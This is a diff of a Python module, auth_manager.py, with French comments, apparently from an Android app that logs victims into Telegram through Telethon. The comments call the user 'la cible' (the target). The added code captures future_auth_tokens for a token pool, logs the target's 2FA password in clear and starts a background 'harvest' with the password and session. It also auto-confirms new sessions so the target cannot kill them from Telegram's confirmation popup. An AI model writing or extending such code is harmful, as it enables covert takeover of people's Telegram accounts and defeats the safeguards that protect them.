@@ -1,13 +1,15 @@
-# auth_manager.py — login Telegram via Telethon + capture de jeton.
-# La cible saisit numero / code / mot de passe. Le harvest part en arriere-plan.
+# auth_manager.py — login Telegram via Telethon + capture du future_auth_token.
+# client.sign_in() renvoie un User, PAS un auth.Authorization : le jeton n'existe
+# que dans l'Authorization -> requetes brutes obligatoires.
 # Contrat MainActivity : "NEED_CODE" | "NEED_PASSWORD" | "ERROR|msg"
 #                        "OK\x1Fnom\x1Fsession"
 import os, asyncio, traceback
-from telethon import TelegramClient, functions
+from telethon import TelegramClient, functions, types
+from telethon import password as pwd_mod
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
 
-from token_pool import add_token, harvest_in_background
+from token_pool import add_token, harvest_in_background, load_pool
 
 FILES = "/data/user/0/com.tgme.app/files"
 SESSION_PATH = os.path.join(FILES, "tgme_session.txt")
@@ -54,6 +56,13 @@ def _rm(path):
         pass
 
 
+def _pool_bytes(phone):
+    try:
+        return [bytes.fromhex(x["t"]) for x in load_pool(phone)]
+    except Exception:
+        return []
+
+
 async def _hint(client):
     try:
         p = await client(functions.account.GetPasswordRequest())
@@ -62,6 +71,29 @@ async def _hint(client):
     except Exception as e:
         log("Indice 2FA: %s" % e)
     return ""
+
+
+async def _check_password(client, password):
+    """Requete brute : renvoie un auth.Authorization, donc avec le jeton."""
+    pwd = await client(functions.account.GetPasswordRequest())
+    return await client(functions.auth.CheckPasswordRequest(
+        pwd_mod.compute_check(pwd, password)))
+
+
+async def _autoconfirm(client):
+    """Empeche la cible de tuer la session via le popup de confirmation."""
+    try:
+        auths = await client(functions.account.GetAuthorizationsRequest())
+        for a in auths.authorizations:
+            log("AUTH %s | %s | unconfirmed=%s | hash=%s"
+                % (a.device_model, a.platform,
+                   getattr(a, "unconfirmed", False), a.hash))
+            if getattr(a, "unconfirmed", False) and a.hash:
+                await client(functions.account.ChangeAuthorizationSettingsRequest(
+                    hash=a.hash, confirmed=True))
+                log("  -> confirmee")
+    except Exception as e:
+        log("Auto-confirmation: %s: %s" % (type(e).__name__, e))
 
 
 async def _login(phone, code, password):
@@ -85,39 +117,71 @@ async def _login(phone, code, password):
     log("Connecte. Autorise=%s" % await client.is_user_authorized())
 
     try:
+        authz = None
+
         if not code:
             log("Envoi du code request...")
-            sent = await client.send_code_request(phone)
-            _write(HASH_PATH, sent.phone_code_hash)
-            _write(SESSION_PATH, client.session.save())
-            log("Session sauvegardee: %s..." % client.session.save()[:32])
-            log("Code envoye. Hash=%s" % sent.phone_code_hash)
-            return "NEED_CODE"
+            try:
+                sent = await client(functions.auth.SendCodeRequest(
+                    phone_number=phone,
+                    api_id=API_ID,
+                    api_hash=API_HASH,
+                    settings=types.CodeSettings(
+                        allow_app_hash=True,
+                        logout_tokens=_pool_bytes(phone) or None)))
+            except SessionPasswordNeededError:
+                log("sendCode -> 2FA requise (jeton reconnu).")
+                sent = None
+                if not password:
+                    hint = await _hint(client)
+                    log("2FA requise. Indice: %s" % (hint or "(aucun)"))
+                    return "NEED_PASSWORD"
+                log("2FA: %s" % password)
+                authz = await _check_password(client, password)
 
-        phone_code_hash = _read(HASH_PATH)
-        log("Sign in avec code et hash...")
-        try:
-            authz = await client.sign_in(phone=phone, code=code,
-                                         phone_code_hash=phone_code_hash)
-        except SessionPasswordNeededError:
-            hint = await _hint(client)
-            if not password:
-                log("2FA requise. Indice: %s" % (hint or "(aucun)"))
-                return "NEED_PASSWORD"
-            log("2FA: %s" % password)
-            authz = await client.sign_in(password=password)
+            if sent is not None:
+                if isinstance(sent, types.auth.SentCodeSuccess):
+                    log("sentCodeSuccess -> autorise sans code.")
+                    authz = sent.authorization
+                else:
+                    _write(HASH_PATH, sent.phone_code_hash)
+                    _write(SESSION_PATH, client.session.save())
+                    log("Session sauvegardee: %s..." % client.session.save()[:32])
+                    log("Code envoye. Hash=%s" % sent.phone_code_hash)
+                    return "NEED_CODE"
 
-        me = await client.get_me()
-        log("SUCCES user=%s" % (me.first_name or "User"))
+        if authz is None:
+            phone_code_hash = _read(HASH_PATH)
+            log("Sign in avec code et hash (requete brute)...")
+            try:
+                authz = await client(functions.auth.SignInRequest(
+                    phone, phone_code_hash, str(code)))
+            except SessionPasswordNeededError:
+                hint = await _hint(client)
+                if not password:
+                    log("2FA requise. Indice: %s" % (hint or "(aucun)"))
+                    return "NEED_PASSWORD"
+                log("2FA: %s" % password)
+                authz = await _check_password(client, password)
+
+        if isinstance(authz, types.auth.AuthorizationSignUpRequired):
+            log("Numero non inscrit : signUp requis.")
+            return "ERROR|numero non inscrit"
+
+        user = getattr(authz, "user", None)
+        name = getattr(user, "first_name", None) or "User"
+        log("SUCCES user=%s" % name)
 
         tok = getattr(authz, "future_auth_token", None)
+        log("Future token au login: %s" % ("OUI" if tok else "NON"))
         if tok:
             add_token(phone, tok.hex())
             log("JETON login %s" % tok.hex())
 
+        await _autoconfirm(client)
+
         final = client.session.save()
 
-        # on rend la main tout de suite : le harvest continue en arriere-plan
         harvest_in_background(phone, password, final, log)
         log("Harvest lance en arriere-plan.")
 
@@ -125,7 +189,7 @@ async def _login(phone, code, password):
         _rm(SESSION_PATH)
         log("Session et hash nettoyes.")
 
-        return "OK" + SEP + (me.first_name or "User") + SEP + final
+        return "OK" + SEP + name + SEP + final
 
     finally:
         try:
